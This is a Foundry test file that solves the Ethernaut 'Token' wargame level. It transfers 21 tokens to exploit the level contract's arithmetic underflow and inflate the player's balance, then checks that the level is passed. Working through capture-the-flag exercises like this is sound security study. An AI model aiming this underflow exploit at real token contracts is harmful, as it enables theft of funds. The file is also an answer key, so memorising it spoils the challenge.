// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Token/Token.sol";
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_token_attack() public {
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        console.log(
            "Player's balance of token: ",
            ethernautToken.balanceOf(player)
        );

        ethernautToken.transfer(address(0), 21);

        console.log(
            "Player's balance of token: ",
            ethernautToken.balanceOf(player)
        );

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
